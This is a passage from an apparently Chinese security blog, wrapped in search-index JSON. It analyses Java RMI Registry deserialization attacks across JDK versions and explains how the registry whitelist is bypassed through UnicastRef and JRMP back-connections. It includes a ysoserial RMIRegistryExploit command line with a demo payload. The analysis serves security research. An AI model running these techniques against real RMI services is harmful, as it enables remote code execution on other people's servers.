<p>\u8fd9\u91cc\u601d\u8def\u662f\u6b63\u786e\u7684\uff0c\u53ef\u4ee5\u9632\u6b62\u5916\u90e8\u7684\u6076\u610f\u7ed1\u5b9a\uff0c\u4f46\u662f\u4ed6\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u95ee\u9898\u3002</p> <p>JDK 8u141\u4e4b\u524d\uff0c\u9996\u5148\u4f1a\u53bb\u63a5\u6536\u4f20\u9001\u8fc7\u6765\u7684\u5bf9\u8c61\uff0c\u5e76\u5c06\u5176\u8fdb\u884c<code>readObject</code>\u53cd\u5e8f\u5217\u5316\uff0c\u5b9e\u9645\u5224\u65ad\u662f\u5426\u4e3a\u672c\u5730\u8bf7\u6c42\uff0c\u662f\u5728put\u65b0\u7684\u7ed1\u5b9a\u5bf9\u8c61\u4e4b\u524d\u8fdb\u884c\u7684\u3002\u8fd9\u610f\u5473\u7740\u5728checkAccess\u4e4b\u524d\u6211\u4eec\u5c31\u53ef\u4ee5\u5b8c\u6210\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u8be5\u9650\u5236\u5e76\u6ca1\u6709\u8d77\u5230\u76f8\u5e94\u7684\u4f5c\u7528\u3002</p> <p></p> <p>\u800c\u5728JDK 8u141\u7248\u672c\u4e4b\u540e\uff0c<code>sun/rmi/registry/RegistryImpl_Skel.java#dispatch</code></p> <p></p> <p>\u8fd9\u91cc\u4f1a\u5148\u53bb\u5224\u65ad\u662f\u5426\u4e3a\u672c\u5730\u7ed1\u5b9a\u8bf7\u6c42\uff0c\u7136\u540e\u518d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u6240\u4ee5\u5982\u679c\u8981\u4f7f\u7528bind/rebind\u8bf7\u6c42\u6765\u8fdc\u7a0b\u653b\u51fbRegistry\uff0cJDK\u7248\u672c\u5fc5\u987b\u57288u141\u4e4b\u524d</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#registrylookup","title":"\u60c5\u666f\u4e8c\uff1aRegistry\u63a5\u6536lookup\u8bf7\u6c42","text":"<p>\u7531\u4e8ebind/rebind\u8bf7\u6c42\u5728141\u540e\u7eed\u7248\u672c\u5b58\u5728\u9650\u5236\uff0c\u6240\u4ee5\u4e3a\u4e86\u653b\u51fbRegistry\u6211\u4eec\u5fc5\u987b\u627e\u5176\u4ed6\u7684\u65b9\u6cd5\u3002</p> <p>\u5728RMI\u91cc\u5ba2\u6237\u7aef\u5411Registry\u53d1\u8d77lookup\u8bf7\u6c42\u662f\u4e0d\u9650\u5236\u8bf7\u6c42\u6e90\u7684\uff0c\u90a3\u4e48lookup\u662f\u5426\u53ef\u4ee5\u88ab\u6211\u4eec\u5229\u7528\u5462\uff1f</p> <p>\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u6765\u770b<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>\u5bf9\u4e8elookup\u8bf7\u6c42\u7684\u5904\u7406</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5728\u8fd9\u91cc\uff0c\u63a5\u6536\u5230lookup\u53d1\u9001\u8fc7\u6765\u7684\u5185\u5bb9\u65f6\uff0c\u4e5f\u662f\u76f4\u63a5\u5bf9\u5176\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u6ca1\u6709bind/rebind\u7684\u8bf7\u6c42\u6e90\u9650\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5lookup\u53d1\u8d77\u5bf9141\u7248\u672c\u4e4b\u540e\u7684registry\u7684\u653b\u51fb\u3002</p> <p>\u6211\u4eec\u5728\u6784\u9020lookup\u51fd\u6570\u8bf7\u6c42\u65f6\uff0c\u53ea\u9700\u91cd\u65b0\u5b9e\u73b0\u4e00\u4e0blookup\u51fd\u6570\u7684\u5b9e\u73b0\u5c31\u53ef\u4ee5\u4e86\uff08\u8fd9\u91cc\u5c06Naming.lookup\u548cRegistryImpl_Stub.lookup\u8fdb\u884c\u4e86\u5408\u5e76\uff0c\u5e76\u5c06\u4f20\u9001\u8fc7\u53bb\u7684\u5185\u5bb9\u6539\u6210\u4e86\u4efb\u610f\u7684Object\u5bf9\u8c61\uff09\u3002</p> <p></p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x02-registry-jdk8u121","title":"0x02 \u653b\u51fbRegistry jdk&lt;8u121","text":"<p>\u73af\u5883\u4f7f\u7528jdk8u111\uff0c\u8be5\u7248\u672c\u4e0b\u7684RMI Registry\u63a5\u6536\u7684remote obj\u53ea\u8981\u7ee7\u627f\u4e86Remote\u7c7b\u5373\u53ef\uff08\u539f\u7406\u89c12\uff09\uff0c\u6ca1\u6709\u5176\u4ed6\u7684\u9650\u5236\u3002</p> <p>ysoserial\u5de5\u5177\u4e2d\u7684<code>ysoserial.exploit.RMIRegisterExploit</code>\u91c7\u7528\u4e86\u4ee3\u7406Remote\u7c7b\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u8fd9\u4e2a\u9650\u5236\u3002</p> <p>\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u5373\u53ef</p> <p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit RMIRegisterHost RMIRegisterPort CommonsCollections7 \"open /System/Applications/Calculator.app\"</code></p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#ysoserialexploitrmiregisterexploit","title":"\u7b80\u5355\u770b\u4e00\u4e0bysoserial.exploit.RMIRegisterExploit\u7684\u539f\u7406","text":"<p>\u6839\u636e\u524d\u9762\u6587\u7ae0\u4e2d\u7684\u539f\u7406\uff0c\u6211\u4eec\u4f20\u8fc7\u53bb\u7684\u5bf9\u8c61\u5fc5\u987b\u8981\u662f\u4e00\u4e2a\u7ee7\u627f\u4e86java.rmi.Remote\u63a5\u53e3\u7684\u5bf9\u8c61\u3002\u8fd9\u91ccysoserial\u5de5\u5177\u5219\u76f4\u63a5\u5229\u7528\u52a8\u6001\u4ee3\u7406\u7684\u539f\u7406\uff0c\u5bf9Remote\u7c7b\u505a\u4ee3\u7406\uff0c\u5176\u5904\u7406\u7684handler\u7528\u4e86CommonsCollections\u4e2d\u5e38\u7528\u7684AnnotationInvocationHandler\u3002\u4f46\u5176\u89e6\u53d1\u70b9\u53d8\u4e3ahandler\u7684memberValues\u5c5e\u6027\u88ab\u53cd\u5e8f\u5217\u5316\u6240\u6267\u884c\u7684\u5229\u7528\u94fe\u3002</p> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u8fdc\u7a0bbind\u5bf9\u8c61\u5c06\u6784\u9020\u597d\u7684remote\u5bf9\u8c61\u4f20\u8fc7\u53bb\u5373\u53ef\uff0c\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u4ee3\u7801</p> <p></p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x03-registry-jdk8u232_b09","title":"0x03 \u653b\u51fbRegistry jdk&lt;8u232_b09","text":"<p>jdk8u121\u4fee\u590d\u540e\u7684\u7248\u672c\u91cc\uff0c\u5bf9\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u505a\u4e86\u767d\u540d\u5355\u9650\u5236\uff0c\u89c1<code>sun/rmi/registry/RegistryImpl.java#registryFilter</code></p> <p>\u8fd9\u4e2a\u767d\u540d\u5355\u5305\u62ec\uff1a</p> <pre><code>if (String.class == clazz\n        || java.lang.Number.class.isAssignableFrom(clazz)\n        || Remote.class.isAssignableFrom(clazz)\n        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)\n        || UnicastRef.class.isAssignableFrom(clazz)\n        || RMIClientSocketFactory.class.isAssignableFrom(clazz)\n        || RMIServerSocketFactory.class.isAssignableFrom(clazz)\n        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)\n        || java.rmi.server.UID.class.isAssignableFrom(clazz)) {\n    return ObjectInputFilter.Status.ALLOWED;\n} else {\n    return ObjectInputFilter.Status.REJECTED;\n}\n</code></pre> <p>0x02\u4e2d\u53d1\u9001\u7684\u5bf9\u8c61\u662f\u4ee3\u7406\u540e\u7684AnnotationInvocationHandler\u5bf9\u8c61\uff0c\u5e76\u4e0d\u5728\u4e0a\u8ff0\u5141\u8bb8\u7684\u7c7b\u91cc\u9762\uff0c\u8fd9\u5bfc\u81f4\u539f\u5148ysoserial\u5de5\u5177\u4e2d\u7684ysoserial.exploit.RMIRegisterExploit\u65e0\u6cd5\u5229\u7528\u3002\u8fd9\u91cc\u6211\u4eec\u53c2\u80033\u7684\u65b9\u6cd5\u6765\u8fbe\u6210\u5229\u7528\u3002</p> <p>\u9996\u5148\u601d\u8def\u6bd4\u8f83\u660e\u786e\u7684\u662f\uff0c\u5982\u679c\u8981\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\uff0c\u6211\u4eec\u9700\u8981\u5728\u4e0a\u8ff0\u7684\u767d\u540d\u5355\u91cc\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u5bf9\u8c61\u3002</p> <p>\u5728\u767d\u540d\u5355\u91cc\u6211\u4eec\u6ce8\u610f\u4e00\u4e0b\u4e24\u4e2a\u7279\u6b8a\u5bf9\u8c61Remote\u5bf9\u8c61\u548cUnicastRef\u5bf9\u8c61</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#1-unicastref","title":"1. UnicastRef\u5bf9\u8c61","text":"<p>\u6211\u4eec\u90fd\u77e5\u9053RMI\u8fc7\u7a0b\u4e2d\u5b58\u5728\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u7aef\u4e4b\u95f4\u7684\u4ea4\u4e92\uff0c\u90a3\u4e48\u5728\u4ee3\u7801\u5c42\u9762\uff0c\u6211\u4eec\u9700\u8981\u600e\u4e48\u53bb\u521b\u9020\u8fd9\u6837\u4e00\u4e2a\u94fe\u63a5\u5462\uff1f</p> <p>\u7531\u4e8e\u6f0f\u6d1e\u53d1\u751f\u70b9\u4e3a\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u6ce8\u518c\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u56de\u987e\u4e00\u4e0b\uff0c\u6211\u4eec\u5728bind\u65f6\uff0c\u4f1a\u5148\u53bb\u83b7\u5f97\u4e00\u4e2aRegistry\uff0c\u7c7b\u4f3c\u4e0b\u9762</p> <pre><code>Registry registry = LocateRegistry.getRegistry(\"192.168.98.80\");\n</code></pre> <p>\u8ddf\u8fdb<code>java/rmi/registry/LocateRegistry.java#getRegistry</code></p> <p></p> <p>\u6ce8\u610f\u5230\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff0c\u901a\u8fc7TCPEndpoint\u6ce8\u518c\u670d\u52a1\u7aef\u7684host\u3001\u7aef\u53e3\u7b49\u4fe1\u606f\uff0c\u4ee5UnicastRef\u5c01\u88c5liveRef.\u5728\u4e0b\u9762createProxy\u65f6\u4f7f\u7528\u4e86RemoteObjectInvocationHandler\u4f5c\u4e3aUnicastRef\u52a8\u6001\u4ee3\u7406\u7684\u5904\u7406\u7c7b</p> <p></p> <p>\u6700\u7ec8\uff0c\u6211\u4eec\u5c06\u4ee5\u5ba2\u6237\u7aef\u7684\u8eab\u4efd\u53bb\u94fe\u63a5\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684Registry\u4f1a\u662f<code>sun/rmi/registry/RegistryImpl_Stub.java#bind</code>\u5411\u8fdc\u7a0bRMI Registry\u6ce8\u518c\u3002</p> <p></p> <p>newCall\u53d1\u8d77\u8fde\u63a5\uff0c\u5e76\u5c06\u9700\u8981\u7ed1\u5b9a\u7684\u5bf9\u8c61\u53d1\u9001\u8fc7\u53bb\u3002</p> <p>\u5230\u8fd9\u91cc\u5c31\u7ed3\u675f\u4e86\u5411\u8fdc\u7a0bRegistry\u53d1\u8d77\u7ed1\u5b9a\u7684\u64cd\u4f5c\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6211\u4eec\u7528\u5230\u4e86UnicastRef\u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd9\u91cc\u60f3\u8c61\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236UnicastRef\u5bf9\u8c61\u91ccLiveRef\u7684host\u548cport\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u80fd\u53d1\u8d77\u4efb\u610f\u7684RMI\u8fde\u63a5\u3002\u8fd9\u91cc\u5c31\u662fysoserial\u4e2dJRMPClient\u7684\u539f\u7406\uff0c\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2apayload</p> <p></p> <p>\u662f\u4e0d\u662f\u5f88\u719f\u6089XD\uff0c\u4f7f\u7528\u7684\u65b9\u6cd5\u5c31\u662f\u524d\u9762\u7ed1\u5b9a\u8fc7\u7a0b\u4e2d\u7684\u4ee3\u7801\u3002\u800c\u5728\u767d\u540d\u5355\u91ccUnicastRef\u5bf9\u8c61\u662f\u5141\u8bb8\u88ab\u53cd\u5e8f\u5217\u5316\u7684\u3002</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#2-remoteobjectinvocationhandler","title":"2. RemoteObjectInvocationHandler\u5bf9\u8c61","text":"<p>\u524d\u9762\u5206\u6790\u5230UnicastRef\u53ef\u88ab\u7528\u4e8e\u53d1\u8d77RMI\u8fde\u63a5\uff0c\u4f46\u662f\u4e3a\u4e86\u7b26\u5408\u53d1\u9001\u7684\u6761\u4ef6\uff0c\u4ecd\u7136\u9700\u8981\u6ee1\u8db3\u5b9e\u73b0Remote\u63a5\u53e3\u7684\u6761\u4ef6\u3002\u800cUnicastRef\u5e76\u6ca1\u6709\u5b9e\u73b0Remote\u63a5\u53e3\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u76f4\u63a5\u4f20UnicastRef\u662f\u4e0d\u884c\u7684\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u518d\u591a\u505a\u4e00\u6b65\uff0c\u8fd9\u91cc\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <ol> <li>\u8ddfRMIRegisterExploit\u4e00\u6837\uff0c\u4f7f\u7528Proxy\u53cd\u5c04\u6765\u5b9e\u73b0\uff0c\u5176handler\u7ee7\u627f\u4e8eRemote\u5e76\u5904\u7406\u4e86\u6784\u9020\u597d\u7684UnicastRef\uff0c\u8fd9\u91cc\u7528\u5230\u7684\u5c31\u662fRemoteObjectInvocationHandler</li> <li>\u627e\u5230\u4e00\u4e2a\u53ef\u4ee5\u5c01\u88c5UnicastRef\u7684\u5bf9\u8c61\uff0c\u5e76\u4e14\u8be5\u5bf9\u8c61\u8fd8\u5b9e\u73b0\u4e86Remote\u5bf9\u8c61</li> </ol> <p>\u8fd9\u91ccJRMPClient\u4f7f\u7528\u7684RemoteObjectInvocationHandler\u5c31\u662f\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff0c\u6211\u4eec\u5c06AnnotationInvocationHandler\u66ff\u6362\u6210RemoteObjectInvocationHandler\u3002\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528RemoteObjectInvocationHandler\u7684\u7236\u7c7bRemoteObject\u7684readObject\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u7684ref\u5c31\u662f\u6211\u4eec\u4f20\u8fdb\u53bb\u7684UnicastRef\uff0c\u8c03\u7528\u5176readExternal\u51fd\u6570\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e0breadExternal</p> <p>Java\u9ed8\u8ba4\u7684\u5e8f\u5217\u5316\u673a\u5236\u975e\u5e38\u7b80\u5355\uff0c\u800c\u4e14\u5e8f\u5217\u5316\u540e\u7684\u5bf9\u8c61\u4e0d\u9700\u8981\u518d\u6b21\u8c03\u7528\u6784\u9020\u5668\u91cd\u65b0\u751f\u6210\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f1a\u5e0c\u671b\u5bf9\u8c61\u7684\u67d0\u4e00\u90e8\u5206\u4e0d\u9700\u8981\u88ab\u5e8f\u5217\u5316\uff0c\u6216\u8005\u8bf4\u4e00\u4e2a\u5bf9\u8c61\u88ab\u8fd8\u539f\u4e4b\u540e\uff0c\u5176\u5185\u90e8\u7684\u67d0\u4e9b\u5b50\u5bf9\u8c61\u9700\u8981\u91cd\u65b0\u521b\u5efa\uff0c\u4ece\u800c\u4e0d\u5fc5\u5c06\u8be5\u5b50\u5bf9\u8c61\u5e8f\u5217\u5316\u3002 \u5728\u8fd9\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5b9e\u73b0Externalizable\u63a5\u53e3\u4ece\u800c\u4ee3\u66ffSerializable\u63a5\u53e3\u6765\u5bf9\u5e8f\u5217\u5316\u8fc7\u7a0b\u8fdb\u884c\u63a7\u5236\u3002 Externalizable\u63a5\u53e3extends Serializable\u63a5\u53e3\uff0c\u800c\u4e14\u5728\u5176\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u4e24\u4e2a\u65b9\u6cd5\uff1awriteExternal()\u548creadExternal()\u3002\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4f1a\u5728\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u8fd8\u539f\u7684\u8fc7\u7a0b\u4e2d\u88ab\u81ea\u52a8\u8c03\u7528\uff0c\u4ee5\u4fbf\u6267\u884c\u4e00\u4e9b\u7279\u6b8a\u7684\u64cd\u4f5c\u3002</p> <p>https://xz.aliyun.com/t/5392</p> <p>\u8fd9\u91cc\u7684readExternal\u5c31\u662f\u91cd\u65b0\u521b\u5efa\u4e00\u4e2atcp\u8fde\u63a5</p> <p></p> <p>\u7ee7\u7eed\u5f80\u4e0b\u8ddf</p> <p></p> <p>\u91cd\u65b0\u751f\u6210\u4e00\u4e2aLiveRef\u5bf9\u8c61\u540e\uff0c\u5c06\u5b58\u50a8\u5230\u5f53\u524d\u7684ConnectionInputStream\u4e0a\u3002\u540e\u7eed\u8be5stream\u4f1a\u7ee7\u7eed\u8c03\u7528registerRefs\u51fd\u6570</p> <p></p> <p>\u6700\u7ec8\u7531DGCClient\u53d1\u8d77\u8fde\u63a5\uff0c\u4e0b\u56fe\u4e2d\u7684loopup\u51fd\u6570</p> <p></p> <p>\u5230\u8fd9\u91cc\u540e\u9762\u5c31\u662fJRMPListener\u53cd\u5e8f\u5217\u5316\u7684\u4e1c\u897f\u4e86\uff0c\u8fd9\u91cc\u5728\u6700\u540e\u8fdb\u884c\u5206\u6790\u3002</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#3-rmiconnectionimpl_stub","title":"3. RMIConnectionImpl_Stub\u5bf9\u8c61","text":"<p>\u524d\u9762\u63d0\u5230\u4e86\u4e24\u79cd\u601d\u8def\uff0c\u8fd8\u6709\u4e00\u79cd\u5c31\u662f\u627e\u5230\u4e00\u4e2a\u5b9e\u73b0\u4e86Remote\u63a5\u53e3\u5e76\u4e14\u5c01\u88c5\u4e86ref\u7684\u5bf9\u8c61\uff0c\u8fd9\u91ccRMIConnectionImpl_Stub\u5bf9\u8c61\u5c31\u662f</p> <p>RemoteObjectInvocationHandler\u540e\u7eed\u7684\u89e6\u53d1\u4e3b\u8981\u4f9d\u9760RemoteObject\u5bf9\u8c61\u7684readObject\u51fd\u6570\u7684\u91cd\u65b0\u586b\u5145\uff0c\u800cRMIConnectionImpl_Stub\u5bf9\u8c61\u4e5f\u7ee7\u627f\u4e86RemoteObject\u6240\u4ee5\u540e\u9762\u7684\u4e00\u4e9b\u8c03\u7528\u8fc7\u7a0b\u8ddf\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u4e00\u6837\uff0c\u4e0d\u518d\u53d9\u8ff0\u3002</p> <p>\u5176\u5b9e\u987a\u7740\u601d\u8def\u627e\u8fd8\u80fd\u53d1\u73b0<code>DGCImpl_Stub</code>\u3001<code>RMIServerImpl_Stub</code>\u3001<code>RegistryImpl_Stub</code>\u3001<code>ReferenceWrapper_Stub</code>\u90fd\u53ef\u4ee5</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#20200616-trick","title":"20200616 \u66f4\u65b0\u4e00\u4e2a\u5c0ftrick","text":"<p>\u524d\u97622\u7684\u90e8\u5206\u63d0\u5230\u4e86\u7531\u4e8eUnicastRef\u7684\u53cd\u5e8f\u5217\u5316\uff0c\u8fd8\u539f\u7684\u5185\u5bb9ref\u4f1a\u88ab\u6ce8\u518c\u5230\u5f53\u524d\u7684ConnectionInputStream\u7684incomingRefTable\uff0c\u5e76\u4e8eStreamRemoteCall\u7684releaseInputStream\u65f6\u8c03\u7528\u53d1\u8d77\u53cd\u5411jrmp\u94fe\u63a5\u3002</p> <p>\u8fd9\u91cc\u7684\u91cd\u70b9\u5728\u4e8eUnicastRef\u7684\u53cd\u5e8f\u5217\u5316\uff0c\u6211\u4eec\u57283\u7684\u90e8\u5206\u627e\u7684\u90a3\u51e0\u4e2a\u7c7b\u90fd\u662f\u56e0\u4e3a\u5c01\u88c5UnicastRef\uff0c\u5728\u5b9e\u9645\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u51e0\u4e2a\u7c7b\u7684\u5c5e\u6027\u88ab\u8c03\u7528\u53cd\u5e8f\u5217\u5316\u800c\u8fd8\u539fUnicastRef\u3002</p> <p>\u5728\u5e38\u89c1\u7684readObject\u51fd\u6570\u7684\u5904\u7406\u4e2d\uff0c\u5176\u5b9e\u6709\u4e00\u70b9\u5f88\u91cd\u8981\uff0c\u4ed6\u662f\u4e00\u4e2a\u9012\u5f52\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\uff0c\u5c31\u7b97\u5f53\u524d\u7c7b\u4e0d\u5b58\u5728\uff0c\u4f46\u662f\u8fd8\u662f\u4f1a\u53bb\u9012\u5f52\u53cd\u5e8f\u5217\u5316\u5f53\u524d\u6570\u636e\u4e2d\u7684\u7c7b\u5c5e\u6027\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e0d\u7528\u524d\u9762\u627e\u5230\u7684\u51e0\u4e2a\u7c7b\uff0c\u81ea\u5df1\u5199\u4e00\u4e2a\u5c01\u88c5UnicastRef\u4e5f\u80fd\u540c\u6837\u8fbe\u5230\u8fd9\u79cd\u6548\u679c\uff0c\u5177\u4f53\u770bRMIConnectWrapped</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x04-jdk8u232_b09","title":"0x04 \u540e\u7eed jdk&gt;=8u232_b09","text":"<p>jdk\u7248\u672c8u232_b09\u4fee\u590d\u4e86\u524d\u9762\u4f7f\u7528\u53cd\u5411\u53d1\u8d77JRMP\u8fde\u63a5\u7684\u5229\u7528\u3002\u4fee\u590d\u70b9\u5305\u62ec\u4e24\u4e2a</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#registryimpl_skel","title":"\u4e00\uff1aRegistryImpl_Skel","text":"<p><code>sun.rmi.registry.RegistryImpl_Skel#dispatcher</code>\uff0c\u8fd9\u91cc\u622a\u4e86lookup\u51fd\u6570\u7684\u5904\u7406\uff0cbind/rebind\u51fd\u6570\u7684\u5904\u7406\u662f\u4e00\u6837\u7684</p> <p></p> <p>\u5f53\u53d1\u751f\u53cd\u5e8f\u5217\u5316\u9519\u8bef\u6216\u8005\u7c7b\u578b\u8f6c\u6362\u9519\u8bef\u65f6\uff0c\u4f1a\u8c03\u7528<code>call.discardPendingRefs</code>\uff0c\u5c06\u73b0\u6709\u7684JRMP\u8fde\u63a5\u6e05\u9664\u6389\u3002\u4e5f\u5c31\u610f\u5473\u7740\u8fd9\u91cc\u6211\u4eec\u65e0\u6cd5\u7528JRMP\u53cd\u5411\u94fe\u63a5\u7684\u65b9\u5f0f\u6765\u8fbe\u6210\u5229\u7528\u4e86\u3002</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#dgcimpl_stub","title":"\u4e8c\uff1aDGCImpl_Stub","text":"<p>\u5f53Registry\u5904\u7406JRMP\u53cd\u8fde\u7684\u65f6\u5019\uff0c\u4f1a\u8c03\u7528<code>DGCImpl_Stub#dirty</code>\uff0c\u800c<code>ref.invoke</code>\u4f1a\u6700\u7ec8\u8c03\u7528<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>\u6765\u5904\u7406\u8fd4\u56de\u7684\u5f02\u5e38\uff0c\u8fd9\u91cc\u4f1a\u6700\u7ec8\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316(\u8be6\u7ec6\u89c10x05\u756a\u5916)</p> <p></p> <p>\u800c\u5728232\u7248\u672c\uff0c\u5c06\u539f\u672c\u5728\u540e\u9762\u6ce8\u518c\u7684<code>leaseFilter</code>\u63d0\u5230\u4e86\u524d\u9762</p> <p></p> <p>\u770b\u770b\u8be5\u8fc7\u6ee4\u5668\u7684\u9650\u5236<code>sun/rmi/transport/DGCImpl_Stub.java#leaseFilter</code></p> <p></p> <p>\u5bf9\u4e8e\u8fd4\u56de\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u53ea\u5141\u8bb8\u4e0a\u9762\u7684\u51e0\u79cd\u7c7b\u578b\uff0c\u800c\u73b0\u6709\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u4e2dHashSet\u3001HashTable\u7b49\u7c7b\u90fd\u662f\u901a\u4e0d\u8fc7\u7684\u3002</p> <p>\u6240\u4ee5\u5728Registry\u53d1\u8d77\u7684\u53cd\u5411\u8fde\u63a5\u662f\u65e0\u6cd5\u5229\u7528\u6210\u529f\u7684\u3002</p> <p>ps:\u8fd9\u91cc\u7528\u7684<code>DGCImpl_Stub</code>\u662f\u5ba2\u6237\u7aef\u53d1\u8d77\u65f6\u4f7f\u7528\u7684\uff0c\u76f8\u5bf9\u5e94\u7684\u8fd8\u6709server\u7aef\u63a5\u6536Client\u53d1\u8d77\u7684\u8fde\u63a5\u7684\u5904\u7406<code>DGCImpl_Skel</code>\uff0cskel\u8fd9\u91cc\u4e5f\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5177\u4f53\u89c10x08</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x05-ysoserialjrmplistenerjrmpclient","title":"0x05 \u756a\u5916\uff1aysoserial\u4e2d\u7684JRMPListener\u4e0eJRMPClient","text":"<p>\u770b\u4e86\u4e0a\u9762\u53ef\u80fd\u4f60\u4f1a\u7591\u60d1\uff0c\u4e3a\u4ec0\u4e48server\u7aef\u53d1\u8d77\u4e00\u4e2aRMI\u7684\u8fde\u63a5\u5c31\u4f1a\u89e6\u53d1java\u53cd\u5e8f\u5217\u5316\uff1f</p> <p>\u524d\u6587\u6211\u4eec\u5c06\u7684\u662fRMI Registry\u5728\u63a5\u6536\u8fdc\u7a0b\u7ed1\u5b9a\u5bf9\u8c61\u65f6\u6240\u53d1\u751f\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u90a3\u4e48RMI Client\u5728\u63a5\u6536Server\u7aef\u7684\u6570\u636e\u65f6\u662f\u5426\u4e5f\u4f1a\u53d1\u751f\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5462\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u6bd5\u7adfRMI\u4ea4\u4e92\u8fc7\u7a0b\u4e2d\u7684\u6570\u636e\u91c7\u7528\u7684\u662f\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u5b58\u5728\u7740\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u3002</p> <p>\u770b\u4e00\u4e0bJRMPListener\u7684\u4ee3\u7801\uff0c\u7b80\u5355\u6765\u8bf4\uff0c\u5176\u5b9e\u73b0\u4e86\u4e0eRMI Client\u7684\u4ea4\u4e92\u6d41\u7a0b\u3002\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u770b\u91cd\u70b9\u7684\u4ee3\u7801</p> <p></p> <p>\u5728\u5b8c\u6210\u524d\u9762\u7684\u4e00\u4e9b\u4ea4\u4e92\u6b65\u9aa4\u540e\uff0cListener\u4f1a\u5411Client\u53d1\u9001\u4e00\u4e2aExceptionalReturn\u7684\u72b6\u6001\uff0c\u5e76\u5c06\u5e8f\u5217\u5316\u7684payload\u586b\u5145\u5230BadAttributeValueExpException\u7684val\u5c5e\u6027\u3002\u8fd9\u91cc\u7528\u7684BadAttributeValueExpException\u5e76\u4e0d\u662f\u6211\u4eec\u4ee5\u524d\u5206\u6790\u65f6\u505a\u7684toString\u89e6\u53d1\u70b9\uff0c\u800c\u662f\u4ec5\u4f5c\u4e3apayload\u7684\u4e00\u4e2a\u8f7d\u4f53\uff0c\u5728\u53cd\u5e8f\u5217\u5316BadAttributeValueExpException\u7684val\u5c5e\u6027\u65f6\u540c\u6837\u53cd\u5e8f\u5217\u5316\u4e86\u6211\u4eec\u7684payload\u3002</p> <p>\u800c\u4f4d\u4e8eClient\u5728\u63a5\u6536\u5230ExceptionalReturn\u65f6\u7684\u5904\u7406\u65b9\u5f0f\u89c1<code>sun/rmi/transport/StreamRemoteCall.java#executeCall</code>\u524d\u9762\u7684\u5206\u6790\u90fd\u7701\u7565\u4e86</p> <p></p> 